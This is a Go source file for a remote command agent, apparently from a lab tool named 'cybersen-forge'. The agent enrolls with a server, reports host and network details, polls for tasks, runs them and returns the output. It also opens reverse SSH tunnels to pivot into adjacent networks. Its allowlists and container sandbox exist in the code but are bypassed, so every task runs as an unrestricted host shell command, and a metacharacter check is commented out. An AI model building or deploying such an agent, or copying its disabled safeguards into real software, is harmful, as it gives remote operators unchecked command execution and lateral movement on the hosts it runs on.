package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode"
)

const agentVersion = "0.3.0"

var (
	defaultCheckinInterval = 1 * time.Second
	commandTimeout         = 15 * time.Second
	maxOutputBytes         = 65536
)

type networkInfo struct {
	Interface string `json:"interface"`
	Address   string `json:"address"`
	Network   string `json:"network"`
}

type pivotInstruction struct {
	ID         int    `json:"id"`
	ListenPort int    `json:"listen_port"`
	TargetHost string `json:"target_host"`
	TargetPort int    `json:"target_port"`
}

type pivotStatus struct {
	ID     int    `json:"id"`
	Status string `json:"status"`
	Error  string `json:"error,omitempty"`
}

type identity struct {
	AgentID    string `json:"agent_id"`
	AgentToken string `json:"agent_token"`
}

type enrollRequest struct {
	Hostname         string        `json:"hostname"`
	Username         string        `json:"username"`
	OS               string        `json:"os"`
	Arch             string        `json:"arch"`
	AgentVersion     string        `json:"agent_version"`
	ProcessID        int           `json:"process_id"`
	Executable       string        `json:"executable"`
	SandboxAvailable bool          `json:"sandbox_available"`
	SandboxRuntime   string        `json:"sandbox_runtime"`
	Networks         []networkInfo `json:"networks"`
	PivotAvailable   bool          `json:"pivot_available"`
}

type enrollResponse struct {
	AgentID         string `json:"agent_id"`
	AgentToken      string `json:"agent_token"`
	CheckinInterval int    `json:"checkin_interval"`
	CommandTimeout  int    `json:"command_timeout"`
	MaxOutputBytes  int    `json:"max_output_bytes"`
}

type task struct {
	ID      int    `json:"id"`
	Command string `json:"command"`
	Mode    string `json:"mode"`
}

type checkinResponse struct {
	Task            *task              `json:"task"`
	Pivots          []pivotInstruction `json:"pivots"`
	CheckinInterval int                `json:"checkin_interval"`
}

type heartbeatRequest struct {
	AgentVersion     string        `json:"agent_version"`
	ProcessID        int           `json:"process_id"`
	Executable       string        `json:"executable"`
	SandboxAvailable bool          `json:"sandbox_available"`
	SandboxRuntime   string        `json:"sandbox_runtime"`
	Networks         []networkInfo `json:"networks"`
	PivotAvailable   bool          `json:"pivot_available"`
	PivotStatuses    []pivotStatus `json:"pivot_statuses"`
}

type resultRequest struct {
	Stdout     string `json:"stdout"`
	Stderr     string `json:"stderr"`
	ExitCode   int    `json:"exit_code"`
	DurationMS int64  `json:"duration_ms"`
	TimedOut   bool   `json:"timed_out"`
}

func main() {
	serverURL := strings.TrimRight(getenv("FORGE_SERVER", "http://127.0.0.1:8000"), "/")
	enrollmentToken := os.Getenv("FORGE_ENROLLMENT_TOKEN")
	sandbox := discoverSandbox()
	pivotConfig := discoverPivotConfig(serverURL)
	pivots := newPivotManager(pivotConfig)
	defer pivots.Close()
	if enrollmentToken == "" {
		fatal("FORGE_ENROLLMENT_TOKEN is required")
	}

	identityPath, err := defaultIdentityPath()
	if err != nil {
		fatal(err.Error())
	}

	ident, err := loadIdentity(identityPath)
	if errors.Is(err, os.ErrNotExist) {
		var enrollment enrollResponse
		enrollment, err = enroll(serverURL, enrollmentToken, pivotConfig.Available)
		if err != nil {
			fatal(fmt.Sprintf("enrollment failed: %v", err))
		}
		ident = identity{AgentID: enrollment.AgentID, AgentToken: enrollment.AgentToken}
		applyServerConfiguration(enrollment.CheckinInterval, enrollment.CommandTimeout, enrollment.MaxOutputBytes)
		if err := saveIdentity(identityPath, ident); err != nil {
			fatal(fmt.Sprintf("could not save identity: %v", err))
		}
		fmt.Printf("[+] enrolled as %s\n", ident.AgentID)
	} else if err != nil {
		fatal(fmt.Sprintf("could not load identity: %v", err))
	} else {
		fmt.Printf("[+] loaded identity %s\n", ident.AgentID)
	}

	var shell *persistentShell
	if sandbox.Available {
		shell = newPersistentShell(sandbox, ident.AgentID)
		defer shell.Close()
	}

	client := &http.Client{Timeout: 25 * time.Second}
	interval := defaultCheckinInterval
	for {
		networks := collectNetworks()
		response, err := checkin(client, serverURL, ident, sandbox, networks, pivotConfig.Available, pivots.Statuses())
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] check-in error: %v\n", err)
			time.Sleep(backoff(interval))
			continue
		}
		pivots.Reconcile(response.Pivots, networks)
		if response.CheckinInterval > 0 {
			interval = time.Duration(response.CheckinInterval) * time.Second
		}
		if response.Task != nil {
			fmt.Printf("[>] task #%d (%s): %s\n", response.Task.ID, response.Task.Mode, response.Task.Command)
			result := executeTask(*response.Task, sandbox, shell)
			if err := submitResult(client, serverURL, ident, response.Task.ID, result); err != nil {
				fmt.Fprintf(os.Stderr, "[-] result submission error: %v\n", err)
			} else {
				fmt.Printf("[<] task #%d complete (exit=%d, %dms)\n", response.Task.ID, result.ExitCode, result.DurationMS)
			}
		}
		time.Sleep(interval)
	}
}

func applyServerConfiguration(checkinSeconds, timeoutSeconds, outputBytes int) {
	if checkinSeconds > 0 {
		defaultCheckinInterval = time.Duration(checkinSeconds) * time.Second
	}
	if timeoutSeconds > 0 {
		commandTimeout = time.Duration(timeoutSeconds) * time.Second
	}
	if outputBytes >= 4096 {
		maxOutputBytes = outputBytes
	}
}

func backoff(base time.Duration) time.Duration {
	if base < time.Second {
		base = time.Second
	}
	if base > 10*time.Second {
		return 10 * time.Second
	}
	return base * 2
}

func enroll(serverURL, enrollmentToken string, pivotAvailable bool) (enrollResponse, error) {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	username := "unknown"
	if currentUser != nil && currentUser.Username != "" {
		username = currentUser.Username
	}
	executable, _ := os.Executable()

	sandbox := discoverSandbox()
	payload := enrollRequest{
		Hostname: hostname, Username: username, OS: runtime.GOOS,
		Arch: runtime.GOARCH, AgentVersion: agentVersion,
		ProcessID: os.Getpid(), Executable: executable,
		SandboxAvailable: sandbox.Available,
		SandboxRuntime:   sandbox.Runtime,
		Networks:         collectNetworks(),
		PivotAvailable:   pivotAvailable,
	}
	var parsed enrollResponse
	if err := doJSON(http.MethodPost, serverURL+"/api/v1/agents/enroll", payload, &parsed, map[string]string{
		"X-Enrollment-Token": enrollmentToken,
	}); err != nil {
		return enrollResponse{}, err
	}
	return parsed, nil
}

func checkin(client *http.Client, serverURL string, ident identity, sandbox sandboxConfig, networks []networkInfo, pivotAvailable bool, statuses []pivotStatus) (checkinResponse, error) {
	executable, _ := os.Executable()
	payload, _ := json.Marshal(heartbeatRequest{
		AgentVersion: agentVersion, ProcessID: os.Getpid(), Executable: executable,
		SandboxAvailable: sandbox.Available, SandboxRuntime: sandbox.Runtime,
		Networks: networks, PivotAvailable: pivotAvailable, PivotStatuses: statuses,
	})
	req, err := http.NewRequest(http.MethodPost, fmt.Sprintf("%s/api/v1/agents/%s/checkin", serverURL, ident.AgentID), bytes.NewReader(payload))
	if err != nil {
		return checkinResponse{}, err
	}
	req.Header.Set("Authorization", "Bearer "+ident.AgentToken)
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return checkinResponse{}, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		message, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		return checkinResponse{}, fmt.Errorf("server returned %s: %s", resp.Status, string(message))
	}
	var parsed checkinResponse
	err = json.NewDecoder(resp.Body).Decode(&parsed)
	return parsed, err
}

type pivotConfig struct {
	Enabled   bool
	Available bool
	SSHHost   string
	SSHUser   string
	SSHKey    string
	SSHPort   string
}

type pivotProcess struct {
	instruction pivotInstruction
	cmd         *exec.Cmd
}

type pivotManager struct {
	mu          sync.Mutex
	config      pivotConfig
	processes   map[int]*pivotProcess
	statuses    map[int]pivotStatus
	lastAttempt map[int]time.Time
}

func discoverPivotConfig(serverURL string) pivotConfig {
	config := pivotConfig{
		Enabled: strings.EqualFold(getenv("FORGE_PIVOT_ENABLED", "false"), "true"),
		SSHHost: strings.TrimSpace(os.Getenv("FORGE_PIVOT_SSH_HOST")),
		SSHUser: strings.TrimSpace(os.Getenv("FORGE_PIVOT_SSH_USER")),
		SSHKey:  strings.TrimSpace(os.Getenv("FORGE_PIVOT_SSH_KEY")),
		SSHPort: getenv("FORGE_PIVOT_SSH_PORT", "22"),
	}
	if !config.Enabled || runtime.GOOS != "linux" {
		return config
	}
	if config.SSHHost == "" {
		if parsed, err := url.Parse(serverURL); err == nil {
			config.SSHHost = parsed.Hostname()
		}
	}
	if config.SSHHost == "" || config.SSHUser == "" || config.SSHKey == "" {
		return config
	}
	if _, err := os.Stat(config.SSHKey); err != nil {
		return config
	}
	if _, err := exec.LookPath("ssh"); err != nil {
		return config
	}
	config.Available = true
	return config
}

func newPivotManager(config pivotConfig) *pivotManager {
	return &pivotManager{
		config:      config,
		processes:   make(map[int]*pivotProcess),
		statuses:    make(map[int]pivotStatus),
		lastAttempt: make(map[int]time.Time),
	}
}

func (m *pivotManager) Statuses() []pivotStatus {
	m.mu.Lock()
	defer m.mu.Unlock()
	items := make([]pivotStatus, 0, len(m.statuses))
	for _, status := range m.statuses {
		items = append(items, status)
	}
	sort.Slice(items, func(i, j int) bool { return items[i].ID < items[j].ID })
	return items
}

func (m *pivotManager) Reconcile(instructions []pivotInstruction, networks []networkInfo) {
	m.mu.Lock()
	defer m.mu.Unlock()

	desired := make(map[int]pivotInstruction, len(instructions))
	for _, instruction := range instructions {
		desired[instruction.ID] = instruction
	}
	for id, process := range m.processes {
		if _, ok := desired[id]; !ok {
			_ = process.cmd.Process.Kill()
			delete(m.processes, id)
			m.statuses[id] = pivotStatus{ID: id, Status: "stopped"}
		}
	}
	for id, instruction := range desired {
		if _, ok := m.processes[id]; ok {
			continue
		}
		if !m.config.Available {
			m.statuses[id] = pivotStatus{ID: id, Status: "failed", Error: "pivot SSH transport is not configured"}
			continue
		}
		if instruction.TargetPort != 22 || !targetInsideNetworks(instruction.TargetHost, networks) {
			m.statuses[id] = pivotStatus{ID: id, Status: "failed", Error: "target must be port 22 inside a directly connected network"}
			continue
		}
		if last := m.lastAttempt[id]; !last.IsZero() && time.Since(last) < 10*time.Second {
			continue
		}
		m.lastAttempt[id] = time.Now()
		m.startLocked(instruction)
	}
}

func (m *pivotManager) startLocked(instruction pivotInstruction) {
	remoteForward := fmt.Sprintf("127.0.0.1:%d:%s:%d", instruction.ListenPort, instruction.TargetHost, instruction.TargetPort)
	args := []string{
		"-N", "-T", "-i", m.config.SSHKey, "-p", m.config.SSHPort,
		"-o", "BatchMode=yes",
		"-o", "ExitOnForwardFailure=yes",
		"-o", "ServerAliveInterval=30",
		"-o", "ServerAliveCountMax=3",
		"-o", "StrictHostKeyChecking=accept-new",
		"-R", remoteForward,
		m.config.SSHUser + "@" + m.config.SSHHost,
	}
	cmd := exec.Command("ssh", args...)
	cmd.Env = os.Environ()
	var stderr bytes.Buffer
	cmd.Stdout = io.Discard
	cmd.Stderr = &stderr
	if err := cmd.Start(); err != nil {
		m.statuses[instruction.ID] = pivotStatus{ID: instruction.ID, Status: "failed", Error: err.Error()}
		return
	}
	m.processes[instruction.ID] = &pivotProcess{instruction: instruction, cmd: cmd}
	m.statuses[instruction.ID] = pivotStatus{ID: instruction.ID, Status: "active"}
	go func(id int, process *exec.Cmd) {
		err := process.Wait()
		m.mu.Lock()
		defer m.mu.Unlock()
		current, exists := m.processes[id]
		if !exists || current.cmd != process {
			return
		}
		delete(m.processes, id)
		message := strings.TrimSpace(stderr.String())
		if err != nil && message == "" {
			message = err.Error()
		}
		if message == "" {
			message = "SSH relay exited"
		}
		m.statuses[id] = pivotStatus{ID: id, Status: "failed", Error: message}
	}(instruction.ID, cmd)
}

func (m *pivotManager) Close() {
	m.mu.Lock()
	defer m.mu.Unlock()
	for id, process := range m.processes {
		_ = process.cmd.Process.Kill()
		delete(m.processes, id)
	}
}

func collectNetworks() []networkInfo {
	interfaces, err := net.Interfaces()
	if err != nil {
		return nil
	}
	seen := map[string]bool{}
	items := []networkInfo{}
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addresses, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, address := range addresses {
			ip, network, err := net.ParseCIDR(address.String())
			if err != nil || ip.To4() == nil {
				continue
			}
			network.IP = ip.Mask(network.Mask)
			key := iface.Name + "|" + address.String()
			if seen[key] {
				continue
			}
			seen[key] = true
			items = append(items, networkInfo{Interface: iface.Name, Address: address.String(), Network: network.String()})
		}
	}
	sort.Slice(items, func(i, j int) bool {
		if items[i].Interface == items[j].Interface {
			return items[i].Address < items[j].Address
		}
		return items[i].Interface < items[j].Interface
	})
	return items
}

func targetInsideNetworks(target string, networks []networkInfo) bool {
	ip := net.ParseIP(target)
	if ip == nil || ip.To4() == nil {
		return false
	}
	for _, item := range networks {
		_, network, err := net.ParseCIDR(item.Network)
		if err == nil && network.Contains(ip) {
			return true
		}
	}
	return false
}

type sandboxConfig struct {
	Enabled   bool
	Available bool
	Runtime   string
	Image     string
	Workspace string
}

func discoverSandbox() sandboxConfig {
	config := sandboxConfig{
		Enabled: strings.EqualFold(getenv("FORGE_ENABLE_SHELL", getenv("FORGE_ENABLE_SANDBOX", "false")), "true"),
		Image:   getenv("FORGE_SHELL_IMAGE", getenv("FORGE_SANDBOX_IMAGE", "alpine:3.20")),
	}
	if !config.Enabled || runtime.GOOS != "linux" {
		return config
	}
	workspace := getenv("FORGE_SHELL_WORKSPACE", os.Getenv("FORGE_SANDBOX_WORKSPACE"))
	if workspace == "" {
		home, err := os.UserHomeDir()
		if err == nil {
			workspace = filepath.Join(home, ".cybersen-forge", "workspace")
		}
	}
	config.Workspace = workspace
	candidates := []string{}
	if preferred := strings.TrimSpace(os.Getenv("FORGE_SHELL_RUNTIME")); preferred != "" {
		candidates = append(candidates, preferred)
	}
	for _, fallback := range []string{"podman", "docker"} {
		alreadyAdded := false
		for _, candidate := range candidates {
			if candidate == fallback {
				alreadyAdded = true
				break
			}
		}
		if !alreadyAdded {
			candidates = append(candidates, fallback)
		}
	}
	for _, candidate := range candidates {
		if _, err := exec.LookPath(candidate); err == nil {
			config.Runtime = candidate
			config.Available = workspace != ""
			break
		}
	}
	return config
}

func executeTask(current task, sandbox sandboxConfig, shell *persistentShell) resultRequest {
	return executeCommand(current.Command)
}

type persistentShell struct {
	mu            sync.Mutex
	config        sandboxConfig
	containerName string
	cmd           *exec.Cmd
	stdin         io.WriteCloser
	reader        *bufio.Reader
}

type shellReadResult struct {
	output   string
	exitCode int
	err      error
}

func newPersistentShell(config sandboxConfig, agentID string) *persistentShell {
	suffix := strings.ReplaceAll(agentID, "_", "-")
	if len(suffix) > 28 {
		suffix = suffix[len(suffix)-28:]
	}
	return &persistentShell{
		config:        config,
		containerName: "cybersen-forge-shell-" + suffix,
	}
}

func (s *persistentShell) Run(command string) resultRequest {
	s.mu.Lock()
	defer s.mu.Unlock()

	if strings.TrimSpace(command) == "" || strings.ContainsRune(command, '\x00') {
		return resultRequest{Stderr: "invalid shell command", ExitCode: 2}
	}
	if err := os.MkdirAll(s.config.Workspace, 0700); err != nil {
		return resultRequest{Stderr: "could not create shell workspace: " + err.Error(), ExitCode: 1}
	}
	if err := s.ensureStarted(); err != nil {
		return resultRequest{Stderr: "could not start lab shell: " + err.Error(), ExitCode: 127}
	}

	marker := fmt.Sprintf("__FORGE_DONE_%d__", time.Now().UnixNano())
	started := time.Now()
	payload := command
	if !strings.HasSuffix(payload, "\n") {
		payload += "\n"
	}
	payload += fmt.Sprintf("printf '\\n%s:%%s\\n' \"$?\"\n", marker)
	if _, err := io.WriteString(s.stdin, payload); err != nil {
		s.reset()
		return resultRequest{Stderr: "shell write failed: " + err.Error(), ExitCode: 1}
	}

	resultChannel := make(chan shellReadResult, 1)
	go func() {
		resultChannel <- readUntilShellMarker(s.reader, marker)
	}()

	timer := time.NewTimer(commandTimeout)
	defer timer.Stop()
	select {
	case read := <-resultChannel:
		duration := time.Since(started).Milliseconds()
		if read.err != nil {
			s.reset()
			return resultRequest{
				Stdout: truncate(read.output), Stderr: read.err.Error(),
				ExitCode: read.exitCode, DurationMS: duration,
			}
		}
		return resultRequest{
			Stdout: truncate(read.output), ExitCode: read.exitCode,
			DurationMS: duration,
		}
	case <-timer.C:
		duration := time.Since(started).Milliseconds()
		s.reset()
		return resultRequest{
			Stderr:   "shell command timed out; the isolated shell was restarted",
			ExitCode: 124, DurationMS: duration, TimedOut: true,
		}
	}
}

func (s *persistentShell) ensureStarted() error {
	if s.cmd != nil && s.cmd.Process != nil && s.cmd.ProcessState == nil {
		return nil
	}
	_ = exec.Command(s.config.Runtime, "rm", "-f", s.containerName).Run()
	args := sandboxShellArguments(s.config, s.containerName)
	cmd := exec.Command(s.config.Runtime, args...)
	cmd.Env = safeEnvironment()
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		_ = stdin.Close()
		return err
	}
	cmd.Stderr = cmd.Stdout
	if err := cmd.Start(); err != nil {
		_ = stdin.Close()
		return err
	}
	s.cmd = cmd
	s.stdin = stdin
	s.reader = bufio.NewReaderSize(stdout, 256*1024)
	return nil
}

func (s *persistentShell) reset() {
	if s.stdin != nil {
		_ = s.stdin.Close()
	}
	if s.cmd != nil && s.cmd.Process != nil {
		_ = s.cmd.Process.Kill()
		_, _ = s.cmd.Process.Wait()
	}
	if s.config.Runtime != "" && s.containerName != "" {
		_ = exec.Command(s.config.Runtime, "rm", "-f", s.containerName).Run()
	}
	s.cmd = nil
	s.stdin = nil
	s.reader = nil
}

func (s *persistentShell) Close() {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.reset()
}

func readUntilShellMarker(reader *bufio.Reader, marker string) shellReadResult {
	var output strings.Builder
	prefix := marker + ":"
	for {
		line, err := reader.ReadString('\n')
		trimmed := strings.TrimRight(line, "\r\n")
		if strings.HasPrefix(trimmed, prefix) {
			exitCode, parseErr := strconv.Atoi(strings.TrimSpace(strings.TrimPrefix(trimmed, prefix)))
			if parseErr != nil {
				return shellReadResult{output: strings.TrimSuffix(output.String(), "\n"), exitCode: 1, err: errors.New("invalid shell completion marker")}
			}
			return shellReadResult{output: strings.TrimSuffix(output.String(), "\n"), exitCode: exitCode}
		}
		if line != "" {
			output.WriteString(line)
		}
		if err != nil {
			if errors.Is(err, io.EOF) {
				return shellReadResult{output: strings.TrimSuffix(output.String(), "\n"), exitCode: 1, err: errors.New("isolated shell exited before completing the command")}
			}
			return shellReadResult{output: strings.TrimSuffix(output.String(), "\n"), exitCode: 1, err: err}
		}
	}
}

func sandboxShellArguments(sandbox sandboxConfig, containerName string) []string {
	volume := sandbox.Workspace + ":/workspace:rw"
	if sandbox.Runtime == "podman" {
		volume += ",Z"
	}
	return []string{
		"run", "--rm", "-i", "--name", containerName,
		"--network=none", "--read-only",
		"--cap-drop=all", "--security-opt=no-new-privileges",
		"--pids-limit=128", "--memory=256m", "--cpus=0.50",
		"--tmpfs", "/tmp:rw,nosuid,nodev,size=64m",
		"-v", volume, "-w", "/workspace",
		sandbox.Image, "/bin/sh",
	}
}

func executeCommand(command string) resultRequest {
	ctx, cancel := context.WithTimeout(context.Background(), commandTimeout)
	defer cancel()

	started := time.Now()

	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		args, err := splitCommandLine(command)
		if err != nil {
			return resultRequest{
				Stderr:   err.Error(),
				ExitCode: 2,
			}
		}

		if err := validateWindowsCommand(args); err != nil {
			return resultRequest{
				Stderr:   "command rejected by agent policy: " + err.Error(),
				ExitCode: 126,
			}
		}

		cmd = exec.CommandContext(ctx, args[0], args[1:]...)
	} else {
		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", command)
	}

	cmd.Env = os.Environ()

	var stdout bytes.Buffer
	var stderr bytes.Buffer

	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	duration := time.Since(started).Milliseconds()

	exitCode := 0
	timedOut := false

	if err != nil {
		var exitErr *exec.ExitError

		if errors.As(err, &exitErr) {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = 1
		}

		if ctx.Err() == context.DeadlineExceeded {
			stderr.WriteString("\ncommand timed out")
			exitCode = 124
			timedOut = true
		}
	}

	return resultRequest{
		Stdout:     truncate(stdout.String()),
		Stderr:     truncate(stderr.String()),
		ExitCode:   exitCode,
		DurationMS: duration,
		TimedOut:   timedOut,
	}
}

func validateCommand(args []string) error {
	if len(args) == 0 {
		return errors.New("empty command")
	}
	for _, arg := range args {
		if strings.ContainsAny(arg, "\x00\r\n") {
			return errors.New("control characters are not allowed")
		}
	}
	if runtime.GOOS == "windows" {
		return validateWindowsCommand(args)
	}
	return validateLinuxCommand(args)
}

func validateLinuxCommand(args []string) error {
	switch args[0] {
	case "hostname", "whoami", "pwd", "uptime":
		return requireNoArgs(args)
	case "id":
		return allowFlags(args[1:], map[string]bool{"-u": true, "-g": true, "-G": true, "-n": true, "-un": true, "-gn": true})
	case "uname":
		return allowFlags(args[1:], map[string]bool{"-a": true, "-s": true, "-r": true, "-m": true, "-n": true})
	case "date":
		return allowDate(args[1:])
	case "ip":
		return allowIP(args[1:])
	case "ss":
		return allowFlags(args[1:], map[string]bool{"-l": true, "-n": true, "-t": true, "-u": true, "-p": true, "-a": true, "-lntup": true, "-tulpn": true})
	case "ps":
		return allowPS(args[1:])
	case "df":
		return allowDF(args[1:])
	case "free":
		return allowFlags(args[1:], map[string]bool{"-h": true, "-m": true, "-g": true})
	case "echo":
		return allowEcho(args[1:])
	case "cat":
		return allowCat(args[1:])
	case "ls":
		return allowLS(args[1:])
	default:
		return fmt.Errorf("executable %q is not allowed", args[0])
	}
}

func validateWindowsCommand(args []string) error {
	executable := strings.ToLower(strings.TrimSuffix(args[0], ".exe"))
	switch executable {
	case "hostname", "systeminfo":
		return requireNoArgs(args)
	case "whoami":
		return allowWindowsArgs(args[1:], map[string]bool{"/all": true, "/user": true, "/groups": true, "/priv": true})
	case "ipconfig":
		return allowWindowsArgs(args[1:], map[string]bool{"/all": true, "/displaydns": true})
	case "tasklist":
		return allowWindowsArgs(args[1:], map[string]bool{"/v": true, "/svc": true})
	case "netstat":
		return allowWindowsArgs(args[1:], map[string]bool{"-a": true, "-n": true, "-o": true, "-ano": true, "-rn": true})
	case "route":
		if len(args) == 2 && strings.EqualFold(args[1], "print") {
			return nil
		}
		return errors.New("use: route print")
	default:
		return fmt.Errorf("executable %q is not allowed on Windows", args[0])
	}
}

func allowWindowsArgs(args []string, allowed map[string]bool) error {
	for _, arg := range args {
		if !allowed[strings.ToLower(arg)] {
			return fmt.Errorf("argument %q is not allowed", arg)
		}
	}
	return nil
}

func requireNoArgs(args []string) error {
	if len(args) != 1 {
		return errors.New("arguments are not allowed")
	}
	return nil
}

func allowFlags(args []string, allowed map[string]bool) error {
	for _, arg := range args {
		if !allowed[arg] {
			return fmt.Errorf("argument %q is not allowed", arg)
		}
	}
	return nil
}

func allowDate(args []string) error {
	for _, arg := range args {
		if arg == "-u" || (strings.HasPrefix(arg, "+") && len(arg) <= 64) {
			continue
		}
		return fmt.Errorf("argument %q is not allowed", arg)
	}
	return nil
}

func allowIP(args []string) error {
	if len(args) == 0 || len(args) > 2 {
		return errors.New("use: ip addr|route|link [show]")
	}
	if args[0] != "addr" && args[0] != "route" && args[0] != "link" {
		return errors.New("only addr, route and link are allowed")
	}
	if len(args) == 2 && args[1] != "show" {
		return errors.New("only optional argument 'show' is allowed")
	}
	return nil
}

func allowPS(args []string) error {
	if len(args) == 0 {
		return nil
	}
	if len(args) == 1 && (args[0] == "aux" || args[0] == "-ef") {
		return nil
	}
	return errors.New("use: ps, ps aux or ps -ef")
}

func allowDF(args []string) error {
	allowed := map[string]bool{"-h": true, "-T": true, "/": true, "/tmp": true}
	return allowFlags(args, allowed)
}

func allowEcho(args []string) error {
	if len(args) > 32 {
		return errors.New("too many arguments")
	}
	for _, arg := range args {
		if len(arg) > 256 {
			return errors.New("argument too long")
		}
	}
	return nil
}

func allowCat(args []string) error {
	if len(args) != 1 {
		return errors.New("cat requires exactly one approved path")
	}
	allowed := map[string]bool{
		"/etc/os-release": true,
		"/etc/hostname":   true,
		"/proc/version":   true,
		"/proc/cpuinfo":   true,
		"/proc/meminfo":   true,
	}
	if !allowed[args[0]] {
		return fmt.Errorf("path %q is not approved", args[0])
	}
	return nil
}

func allowLS(args []string) error {
	if len(args) > 2 {
		return errors.New("use: ls [-la] [.|/tmp]")
	}
	for _, arg := range args {
		if arg != "-la" && arg != "-l" && arg != "." && arg != "/tmp" {
			return fmt.Errorf("argument %q is not allowed", arg)
		}
	}
	return nil
}

func safeEnvironment() []string {
	return os.Environ()
}

func splitCommandLine(input string) ([]string, error) {
	var args []string
	var current strings.Builder
	var quote rune
	escaped := false
	flush := func() {
		if current.Len() > 0 {
			args = append(args, current.String())
			current.Reset()
		}
	}
	for _, r := range input {
		if escaped {
			current.WriteRune(r)
			escaped = false
			continue
		}
		if r == '\\' {
			escaped = true
			continue
		}
		if quote != 0 {
			if r == quote {
				quote = 0
			} else {
				current.WriteRune(r)
			}
			continue
		}
		if r == '\'' || r == '"' {
			quote = r
			continue
		}
		if unicode.IsSpace(r) {
			flush()
			continue
		}
		//		if strings.ContainsRune(";&|><`$(){}[]", r) {
		//			return nil, fmt.Errorf("shell metacharacter %q is not allowed", string(r))
		//		}
		current.WriteRune(r)
	}
	if escaped {
		return nil, errors.New("unfinished escape sequence")
	}
	if quote != 0 {
		return nil, errors.New("unterminated quote")
	}
	flush()
	if len(args) == 0 {
		return nil, errors.New("empty command")
	}
	return args, nil
}

func submitResult(client *http.Client, serverURL string, ident identity, taskID int, result resultRequest) error {
	body, _ := json.Marshal(result)
	endpoint := fmt.Sprintf("%s/api/v1/agents/%s/tasks/%d/result", serverURL, ident.AgentID, taskID)
	req, err := http.NewRequest(http.MethodPost, endpoint, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+ident.AgentToken)
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		message, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		return fmt.Errorf("server returned %s: %s", resp.Status, string(message))
	}
	return nil
}

func doJSON(method, url string, input, output any, headers map[string]string) error {
	body, err := json.Marshal(input)
	if err != nil {
		return err
	}
	req, err := http.NewRequest(method, url, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	for key, value := range headers {
		req.Header.Set(key, value)
	}
	resp, err := (&http.Client{Timeout: 20 * time.Second}).Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		message, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		return fmt.Errorf("server returned %s: %s", resp.Status, string(message))
	}
	return json.NewDecoder(resp.Body).Decode(output)
}

func defaultIdentityPath() (string, error) {
	if configured := os.Getenv("FORGE_IDENTITY_PATH"); configured != "" {
		return configured, nil
	}
	home, err := os.UserHomeDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(home, ".cybersen-forge", "identity.json"), nil
}

func loadIdentity(path string) (identity, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return identity{}, err
	}
	var ident identity
	if err := json.Unmarshal(data, &ident); err != nil {
		return identity{}, err
	}
	if ident.AgentID == "" || ident.AgentToken == "" {
		return identity{}, errors.New("identity file is incomplete")
	}
	return ident, nil
}

func saveIdentity(path string, ident identity) error {
	if err := os.MkdirAll(filepath.Dir(path), 0700); err != nil {
		return err
	}
	data, err := json.MarshalIndent(ident, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(path, data, 0600)
}

func truncate(value string) string {
	if len(value) <= maxOutputBytes {
		return value
	}
	return value[:maxOutputBytes] + "\n[output truncated]"
}

func getenv(key, fallback string) string {
	if value := os.Getenv(key); value != "" {
		return value
	}
	return fallback
}

func fatal(message string) {
	fmt.Fprintln(os.Stderr, message)
	os.Exit(1)
}

// Keep these imports referenced in older Go toolchains when build tags differ.
var _ = bufio.ErrInvalidUnreadByte
var _ = strconv.IntSize
